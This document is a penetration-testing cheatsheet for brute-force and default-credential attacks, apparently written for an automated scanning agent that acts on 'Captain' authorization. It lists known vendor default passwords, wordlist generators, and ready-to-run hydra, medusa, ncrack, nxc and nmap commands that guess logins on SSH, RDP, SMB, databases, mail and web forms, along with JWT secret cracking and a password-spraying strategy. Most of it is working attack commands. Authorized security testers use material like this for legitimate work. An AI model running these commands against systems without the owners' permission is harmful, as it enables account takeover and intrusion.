# Brute-Force & Default Credentials — Scanner Cheatsheet

**Authorization & safety**: brute-force ONLY with explicit Captain authorization.
Hydra is installed locally (`/usr/bin/hydra`); `-t 4..16` threads, `-f` stop-on-success,
prefer small targeted lists. Other tools (ncrack, medusa, legba, patator, kerbrute,
mssqlpwner, odat) may need installing — verify with `command -v <tool>` first.

## Default credential sources
- SecLists: `Passwords/Default-Credentials/default-passwords.csv`
- DefaultCreds-cheat-sheet (ihebski), cirt.net/passwords, many-passwords.github.io
- Vendor defaults worth memorizing: admin/admin, admin/password, admin/1234, admin/admin123,
  root/toor, test/test, guest/guest, tomcat/tomcat+s3cret, weblogic/weblogic|welcome1,
  jboss/admin, grafana/admin:admin, zabbix/Admin:zabbix, rabbitmq guest:guest,
  iDRAC root/calvin, IMM USERID/PASSW0RD, Supermicro ADMIN/ADMIN, ESXi root:(blank).

## Wordlist generation
```bash
crunch 4 6 0123456789ABCDEF -o wl.txt          # charset-based
crunch 6 8 -t ,@@^^%%                          # pattern: ,=upper @=lower ^=special %=digit
cewl <URL> -m 5 -w words.txt                    # target-site words
python3 cupp.py -i                              # victim-profile based
```

## Per-service commands (hydra syntax unless noted)
```bash
# FTP
hydra -l root -P pass.txt -t 16 <IP> ftp
ncrack -p 21 --user root -P pass.txt <IP>

# SSH (use -t 4: OpenSSH kicks connections past MaxStartups)
hydra -L users.txt -P pass.txt -t 4 <IP> ssh
medusa -h <IP> -U users.txt -P pass.txt -M ssh
ncrack -U users.txt -P pass.txt ssh://<IP>

# Telnet / RDP / VNC
hydra -l admin -P pass.txt <IP> telnet
hydra -L users.txt -P pass.txt -t 4 <IP> rdp
ncrack -vv --user admin -P pass.txt rdp://<IP>
crowbar -b rdp -s <IP>/32 -U users.txt -c 'password123'      # password spray
hydra -P pass.txt <IP> vnc          # no username for VNC
ncrack -P pass.txt vnc://<IP>:5901

# HTTP
hydra -L users.txt -P pass.txt <IP> http-get /admin/          # basic auth (https-get for TLS)
hydra -l admin -P pass.txt <IP> http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect" -V
hydra -l admin -P pass.txt <IP> https-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=Error"
medusa -h <IP> -u admin -P pass.txt -M http -m DIR:/admin

# CMS
cmsmap -f W -u admin -p pass.txt <URL>          # W/J/D/M for WP/Joomla/Drupal/Moodle
wpscan --url <URL> --passwords pass.txt --usernames admin

# SMB
hydra -l admin -P pass.txt smb://<IP>
nxc smb hosts.txt -u users.txt -p pass.txt --continue-on-success
msf> auxiliary/scanner/smb/smb_login

# Databases
hydra -L users.txt -P pass.txt <IP> mysql
hydra -L users.txt -P pass.txt <IP> postgres
hydra -l sa -P pass.txt mssql://<IP>
legba mssql --username sa --password pass.txt --target <IP>:1433
hydra -l root -P pass.txt <IP> mongodb          # or nmap mongodb-brute
hydra -P pass.txt <IP> redis                    # no username (or 'default')
# Oracle: patator oracle_login sid=<SID> host=<IP> user=FILE0 password=FILE1 0=u.txt 1=p.txt -x ignore:code=ORA-01017
# odat.py passwordguesser -s <IP> -d <SID>

# Mail
hydra -l user -P pass.txt -f <IP> pop3 ; hydra -S -l user -P pass.txt -s 995 pop3
hydra -l user -P pass.txt -f <IP> imap ; hydra -S -l user -P pass.txt -s 993 imap
hydra -L users.txt -P pass.txt smtp://<IP>      # AUTH LOGIN/PLAIN

# Others
hydra -L users.txt -P pass.txt <IP> ldap2 -l "" # see nmap ldap-brute -p 389
hydra -l admin -P pass.txt <IP> mqtt            # or ncrack mqtt://<IP>
nmap -sV --script rsync-brute -p 873 <IP>
nmap --script socks-brute -p 1080 <IP>
nmap -sU --script snmp-brute <IP>
thc-pptp-bruter -u admin -P pass.txt <IP>       # PPTP pipe input
hydra -L users.txt -P pass.txt <IP> cisco       # cisco enable / snmp variants
```

## JWT secret cracking
```bash
hashcat -m 16500 -a 0 jwt.txt wordlist
john jwt.txt --format=HMAC-SHA256 --wordlist=wl.txt
python3 jwt_tool.py -d wl.txt <token>
```

## Spray vs brute strategy
1. Default creds first (tiny list, fast, low noise).
2. Password spray: 1-2 passwords × many users (lockout-safe: `-t 4`, sleep between rounds).
3. Full brute only on high-value single accounts with Captain sign-off.
4. Always watch for lockout indicators (responses changing to "locked") and STOP.
